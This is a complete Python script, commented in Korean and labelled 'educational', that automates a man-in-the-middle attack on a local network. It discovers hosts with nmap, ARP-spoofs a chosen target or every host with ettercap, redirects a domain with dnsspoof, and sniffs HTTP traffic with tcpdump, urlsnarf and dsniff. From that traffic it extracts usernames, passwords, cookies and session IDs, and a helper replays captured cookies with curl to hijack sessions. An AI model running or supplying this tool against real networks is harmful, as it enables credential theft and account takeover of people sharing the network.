#!/usr/bin/env python3
import subprocess
import os
import sys
import re
import json
import time
import threading
from datetime import datetime
import signal

class KaliNetworkAttack:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.captured_data = {
            "credentials": [],
            "cookies": [],
            "sessions": [],
            "hosts": []
        }
        self.processes = []
        
    def check_root(self):
        """Root 권한 확인"""
        if os.geteuid() != 0:
            print("[!] This script requires root privileges!")
            sys.exit(1)
    
    def enable_ip_forward(self):
        """IP 포워딩 활성화"""
        print("[*] Enabling IP forwarding...")
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    
    def disable_ip_forward(self):
        """IP 포워딩 비활성화"""
        subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
    
    def get_network_info(self):
        """네트워크 정보 수집"""
        print("[*] Gathering network information...")
        
        # 현재 IP 주소 가져오기
        cmd = f"ip addr show {self.interface} | grep 'inet ' | awk '{{print \$2}}' | cut -d/ -f1"
        my_ip = subprocess.check_output(cmd, shell=True).decode().strip()
        
        # 게이트웨이 가져오기
        cmd = "ip route | grep default | awk '{print \$3}'"
        gateway = subprocess.check_output(cmd, shell=True).decode().strip()
        
        # 서브넷 가져오기
        cmd = f"ip addr show {self.interface} | grep 'inet ' | awk '{{print \$2}}'"
        subnet = subprocess.check_output(cmd, shell=True).decode().strip()
        
        return {
            "ip": my_ip,
            "gateway": gateway,
            "subnet": subnet
        }
    
    def scan_network(self):
        """nmap을 사용한 네트워크 스캔"""
        print("[*] Scanning network for live hosts...")
        
        network_info = self.get_network_info()
        subnet = network_info["subnet"]
        
        # nmap으로 빠른 스캔
        cmd = f"nmap -sn {subnet} -oG -"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # 결과 파싱
        hosts = []
        for line in result.stdout.split('\n'):
            if "Host:" in line and "Status: Up" in line:
                ip = re.search(r'Host: (\d+\.\d+\.\d+\.\d+)', line)
                if ip:
                    hosts.append(ip.group(1))
        
        self.captured_data["hosts"] = hosts
        print(f"[+] Found {len(hosts)} live hosts")
        return hosts
    
    def arp_spoof(self, target_ip, gateway_ip):
        """ettercap을 사용한 ARP 스푸핑"""
        print(f"[*] Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
        
        # ettercap 명령어
        cmd = f"ettercap -T -M arp:remote /{target_ip}// /{gateway_ip}// -i {self.interface}"
        
        # 백그라운드 프로세스로 실행
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.processes.append(process)
        
        print("[+] ARP spoofing started")
        return process
    
    def start_tcpdump(self, output_file=None, filter_expr="tcp port 80 or tcp port 8080"):
        """tcpdump를 사용한 패킷 캡처"""
        print(f"[*] Starting packet capture with filter: {filter_expr}")
        
        if output_file:
            cmd = f"tcpdump -i {self.interface} -w {output_file} '{filter_expr}'"
        else:
            cmd = f"tcpdump -i {self.interface} -nn -A -s0 '{filter_expr}'"
        
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        self.processes.append(process)
        
        # 실시간으로 출력 파싱
        if not output_file:
            threading.Thread(target=self._parse_tcpdump_output, args=(process,), daemon=True).start()
        
        return process
    
    def _parse_tcpdump_output(self, process):
        """tcpdump 출력 실시간 파싱"""
        buffer = ""
        
        for line in iter(process.stdout.readline, ''):
            buffer += line
            
            # HTTP 요청 감지
            if "POST" in line or "GET" in line:
                # 다음 몇 줄을 더 읽어서 전체 요청 확인
                for _ in range(20):
                    next_line = process.stdout.readline()
                    if next_line:
                        buffer += next_line
                
                # 크레덴셜 추출
                self._extract_credentials(buffer)
                # 쿠키 추출
                self._extract_cookies(buffer)
                # 세션 추출
                self._extract_sessions(buffer)
                
                buffer = ""
    
    def _extract_credentials(self, data):
        """로그인 정보 추출"""
        # 일반적인 로그인 패턴
        patterns = [
            r'username=([^&\s]+)',
            r'password=([^&\s]+)',
            r'email=([^&\s]+)',
            r'user=([^&\s]+)',
            r'pass=([^&\s]+)',
            r'login=([^&\s]+)',
            r'pwd=([^&\s]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, data, re.IGNORECASE)
            if matches:
                cred_info = {
                    "timestamp": datetime.now().isoformat(),
                    "pattern": pattern.split('=')[0],
                    "value": matches[0]
                }
                self.captured_data["credentials"].append(cred_info)
                print(f"[+] Credential found: {cred_info}")
    
    def _extract_cookies(self, data):
        """쿠키 정보 추출"""
        cookie_patterns = [
            r'Cookie:\s*([^\r\n]+)',
            r'Set-Cookie:\s*([^\r\n]+)'
        ]
        
        for pattern in cookie_patterns:
            matches = re.findall(pattern, data)
            if matches:
                cookie_info = {
                    "timestamp": datetime.now().isoformat(),
                    "cookie": matches[0]
                }
                self.captured_data["cookies"].append(cookie_info)
                print(f"[+] Cookie captured: {matches[0][:50]}...")
    
    def _extract_sessions(self, data):
        """세션 ID 추출"""
        session_patterns = [
            r'PHPSESSID=([a-zA-Z0-9]+)',
            r'JSESSIONID=([a-zA-Z0-9]+)',
            r'ASP\.NET_SessionId=([a-zA-Z0-9]+)',
            r'session_id=([a-zA-Z0-9]+)',
            r'sid=([a-zA-Z0-9]+)'
        ]
        
        for pattern in session_patterns:
            matches = re.findall(pattern, data)
            if matches:
                session_info = {
                    "timestamp": datetime.now().isoformat(),
                    "type": pattern.split('=')[0],
                    "id": matches[0]
                }
                self.captured_data["sessions"].append(session_info)
                print(f"[+] Session captured: {session_info}")
    
    def dns_spoof(self, target_domain, fake_ip):
        """dnsspoof 도구 사용"""
        print(f"[*] Starting DNS spoofing: {target_domain} -> {fake_ip}")
        
        # hosts 파일 생성
        with open("/tmp/dnsspoof.hosts", "w") as f:
            f.write(f"{fake_ip} {target_domain}\n")
        
        cmd = f"dnsspoof -i {self.interface} -f /tmp/dnsspoof.hosts"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.processes.append(process)
        
        print("[+] DNS spoofing started")
        return process
    
    def start_urlsnarf(self):
        """urlsnarf를 사용한 URL 캡처"""
        print("[*] Starting URL sniffing...")
        
        cmd = f"urlsnarf -i {self.interface}"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        self.processes.append(process)
        
        # 백그라운드에서 출력 처리
        threading.Thread(target=self._process_urlsnarf, args=(process,), daemon=True).start()
        
        return process
    
    def _process_urlsnarf(self, process):
        """urlsnarf 출력 처리"""
        for line in iter(process.stdout.readline, ''):
            if line:
                print(f"[URL] {line.strip()}")
    
    def start_dsniff(self):
        """dsniff를 사용한 패스워드 스니핑"""
        print("[*] Starting password sniffing...")
        
        cmd = f"dsniff -i {self.interface}"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        self.processes.append(process)
        
        # 백그라운드에서 출력 처리
        threading.Thread(target=self._process_dsniff, args=(process,), daemon=True).start()
        
        return process
    
    def _process_dsniff(self, process):
        """dsniff 출력 처리"""
        for line in iter(process.stdout.readline, ''):
            if line and ("password" in line.lower() or "login" in line.lower()):
                print(f"[DSNIFF] {line.strip()}")
                self.captured_data["credentials"].append({
                    "timestamp": datetime.now().isoformat(),
                    "source": "dsniff",
                    "data": line.strip()
                })
    
    def analyze_pcap(self, pcap_file):
        """tshark를 사용한 PCAP 파일 분석"""
        print(f"[*] Analyzing {pcap_file}...")
        
        # HTTP POST 요청 추출
        cmd = f"tshark -r {pcap_file} -Y 'http.request.method == POST' -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri -e http.file_data"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.stdout:
            print("[+] POST requests found:")
            print(result.stdout)
        
        # 쿠키 추출
        cmd = f"tshark -r {pcap_file} -Y 'http.cookie' -T fields -e ip.src -e http.cookie"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.stdout:
            print("[+] Cookies found:")
            print(result.stdout)
    
    def save_results(self, filename="captured_data.json"):
        """결과 저장"""
        with open(filename, 'w') as f:
            json.dump(self.captured_data, f, indent=4)
        print(f"[*] Results saved to {filename}")
    
    def cleanup(self):
        """정리 작업"""
        print("\n[*] Cleaning up...")
        
        # 모든 프로세스 종료
        for process in self.processes:
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                process.kill()
        
        # IP 포워딩 비활성화
        self.disable_ip_forward()
        
        # 임시 파일 삭제
        if os.path.exists("/tmp/dnsspoof.hosts"):
            os.remove("/tmp/dnsspoof.hosts")
        
        print("[+] Cleanup completed")

class AutomatedAttack:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.attack = KaliNetworkAttack(interface)
        
    def run_mitm_attack(self, target_ip=None):
        """완전 자동화된 MITM 공격"""
        print("""
        ╔══════════════════════════════════════╗
        ║   Automated MITM Attack Tool         ║
        ║   Educational Purpose Only!          ║
        ╚══════════════════════════════════════╝
        """)
        
        # Root 권한 확인
        self.attack.check_root()
        
        # 네트워크 정보 수집
        network_info = self.attack.get_network_info()
        print(f"\n[*] Network Information:")
        print(f"    Interface: {self.interface}")
        print(f"    IP: {network_info['ip']}")
        print(f"    Gateway: {network_info['gateway']}")
        print(f"    Subnet: {network_info['subnet']}")
        
        # 타겟 선택
        if not target_ip:
            print("\n[*] Scanning for targets...")
            hosts = self.attack.scan_network()
            
            if hosts:
                print("\n[*] Available targets:")
                for i, host in enumerate(hosts):
                    print(f"    {i+1}. {host}")
                
                choice = input("\nSelect target (number): ")
                try:
                    target_ip = hosts[int(choice)-1]
                except:
                    print("[!] Invalid selection")
                    return
        
        print(f"\n[*] Target selected: {target_ip}")
        
        # IP 포워딩 활성화
        self.attack.enable_ip_forward()
        
        # 공격 시작
        print("\n[*] Starting attack sequence...")
        
        # 1. ARP 스푸핑
        self.attack.arp_spoof(target_ip, network_info['gateway'])
        time.sleep(3)
        
        # 2. 패킷 캡처 시작
        pcap_file = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        self.attack.start_tcpdump(output_file=pcap_file)
        
        # 3. 실시간 스니핑 도구들 시작
        self.attack.start_tcpdump()  # 콘솔 출력용
        self.attack.start_urlsnarf()
        self.attack.start_dsniff()
        
        print("\n[+] Attack is running. Press Ctrl+C to stop...")
        print("[*] Capturing credentials, cookies, and sessions...")
        
        try:
            # 실행 유지
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
            
        finally:
            # 정리 작업
            self.attack.cleanup()
            
            # 결과 저장
            self.attack.save_results()
            
            # PCAP 파일 분석
            if os.path.exists(pcap_file):
                self.attack.analyze_pcap(pcap_file)
    
    def run_dns_attack(self, target_domain, fake_ip):
        """DNS 스푸핑 공격"""
        self.attack.check_root()
        self.attack.enable_ip_forward()
        
        # 네트워크 스캔
        hosts = self.attack.scan_network()
        
        # 모든 호스트에 대해 ARP 스푸핑
        network_info = self.attack.get_network_info()
        for host in hosts:
            if host != network_info['ip'] and host != network_info['gateway']:
                self.attack.arp_spoof(host, network_info['gateway'])
        
        # DNS 스푸핑 시작
        self.attack.dns_spoof(target_domain, fake_ip)
        
        print(f"\n[+] DNS spoofing active: {target_domain} -> {fake_ip}")
        print("[*] Press Ctrl+C to stop...")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.attack.cleanup()

# 추가 유틸리티 함수들
def quick_scan(interface="eth0"):
    """빠른 네트워크 스캔"""
    attack = KaliNetworkAttack(interface)
    attack.check_root()
    
    print("[*] Quick network scan...")
    hosts = attack.scan_network()
    
    # 각 호스트의 열린 포트 스캔
    for host in hosts:
        print(f"\n[*] Scanning {host}...")
        cmd = f"nmap -F -T4 {host}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # 열린 포트만 출력
        for line in result.stdout.split('\n'):
            if "open" in line and "tcp" in line:
                print(f"    {line.strip()}")

def monitor_http_traffic(interface="eth0", duration=60):
    """HTTP 트래픽 모니터링"""
    print(f"[*] Monitoring HTTP traffic for {duration} seconds...")
    
    cmd = f"timeout {duration} tcpdump -i {interface} -nn -A -s0 'tcp port 80 or tcp port 8080' 2>/dev/null"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, text=True)
    
    credentials = []
    cookies = []
    urls = []
    
    buffer = ""
    for line in iter(process.stdout.readline, ''):
        buffer += line
        
        # HTTP 요청 완료 시 파싱
        if line.strip() == "" and buffer:
            # URL 추출
            url_match = re.search(r'(GET|POST)\s+([^\s]+)\s+HTTP', buffer)
            if url_match:
                urls.append(url_match.group(2))
            
            # 크레덴셜 추출
            for pattern in ['username=', 'password=', 'email=', 'user=', 'pass=']:
                if pattern in buffer:
                    start = buffer.find(pattern)
                    end = buffer.find('&', start)
                    if end == -1:
                        end = buffer.find(' ', start)
                    if end == -1:
                        end = start + 50
                    
                    cred = buffer[start:end].strip()
                    if cred and len(cred) < 100:
                        credentials.append(cred)
            
            # 쿠키 추출
            cookie_match = re.search(r'Cookie:\s*([^\r\n]+)', buffer)
            if cookie_match:
                cookies.append(cookie_match.group(1))
            
            buffer = ""
    
    # 결과 출력
    print(f"\n[+] Monitoring complete!")
    print(f"[*] Found {len(urls)} URLs")
    print(f"[*] Found {len(credentials)} potential credentials")
    print(f"[*] Found {len(cookies)} cookies")
    
    if credentials:
        print("\n[+] Credentials:")
        for cred in set(credentials):
            print(f"    {cred}")
    
    if urls:
        print("\n[+] URLs visited:")
        for url in set(urls)[:20]:  # 상위 20개만
            print(f"    {url}")

def session_hijack_helper(cookie_string, target_url):
    """캡처한 쿠키로 세션 하이재킹 테스트"""
    print(f"[*] Testing session hijack on {target_url}")
    
    # curl을 사용한 요청
    cmd = f'curl -s -I -H "Cookie: {cookie_string}" "{target_url}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    # 상태 코드 확인
    status_match = re.search(r'HTTP/\d\.\d\s+(\d+)', result.stdout)
    if status_match:
        status_code = status_match.group(1)
        print(f"[+] Response status: {status_code}")
        
        if status_code == "200":
            print("[+] Session hijack successful!")
        elif status_code == "302" or status_code == "301":
            print("[*] Redirect detected - might need to follow")
        else:
            print("[-] Session might be invalid")
    
    return result.stdout

# 메인 실행 스크립트
def main():
    print("""
    ╔════════════════════════════════════════════╗
    ║        Kali Network Attack Suite           ║
    ║         Educational Purpose Only!          ║
    ╚════════════════════════════════════════════╝
    
    1. Full MITM Attack (ARP + Sniffing)
    2. Quick Network Scan
    3. Monitor HTTP Traffic
    4. DNS Spoofing Attack
    5. Analyze PCAP File
    6. Custom Attack
    
    """)
    
    choice = input("Select option (1-6): ")
    
    if choice == "1":
        # Full MITM Attack
        interface = input("Network interface (default: eth0): ") or "eth0"
        target = input("Target IP (leave empty for auto-select): ")
        
        attack = AutomatedAttack(interface)
        attack.run_mitm_attack(target if target else None)
        
    elif choice == "2":
        # Quick scan
        interface = input("Network interface (default: eth0): ") or "eth0"
        quick_scan(interface)
        
    elif choice == "3":
        # Monitor HTTP
        interface = input("Network interface (default: eth0): ") or "eth0"
        duration = input("Duration in seconds (default: 60): ") or "60"
        monitor_http_traffic(interface, int(duration))
        
    elif choice == "4":
        # DNS Spoofing
        interface = input("Network interface (default: eth0): ") or "eth0"
        domain = input("Target domain (e.g., example.com): ")
        fake_ip = input("Fake IP address: ")
        
        attack = AutomatedAttack(interface)
        attack.run_dns_attack(domain, fake_ip)
        
    elif choice == "5":
        # Analyze PCAP
        pcap_file = input("PCAP file path: ")
        if os.path.exists(pcap_file):
            attack = KaliNetworkAttack()
            attack.analyze_pcap(pcap_file)
        else:
            print("[!] File not found")
            
    elif choice == "6":
        # Custom attack
        print("\n[*] Custom Attack Configuration")
        interface = input("Network interface (default: eth0): ") or "eth0"
        
        attack = KaliNetworkAttack(interface)
        attack.check_root()
        
        # 개별 도구 선택
        print("\nSelect tools to use:")
        use_arp = input("Use ARP spoofing? (y/n): ").lower() == 'y'
        use_tcpdump = input("Use tcpdump? (y/n): ").lower() == 'y'
        use_urlsnarf = input("Use urlsnarf? (y/n): ").lower() == 'y'
        use_dsniff = input("Use dsniff? (y/n): ").lower() == 'y'
        
        if use_arp:
            target = input("Target IP: ")
            network_info = attack.get_network_info()
            attack.arp_spoof(target, network_info['gateway'])
        
        attack.enable_ip_forward()
        
        if use_tcpdump:
            attack.start_tcpdump()
        if use_urlsnarf:
            attack.start_urlsnarf()
        if use_dsniff:
            attack.start_dsniff()
        
        print("\n[*] Custom attack running. Press Ctrl+C to stop...")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            attack.cleanup()
            attack.save_results()

if __name__ == "__main__":
    # Ctrl+C 핸들러
    def signal_handler(sig, frame):
        print("\n[!] Caught interrupt signal")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Root 권한 확인
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        print("[*] Try: sudo python3 {}".format(sys.argv[0]))
        sys.exit(1)
    
    main()


# 실행 방법 : sudo python3 network_attack(study).py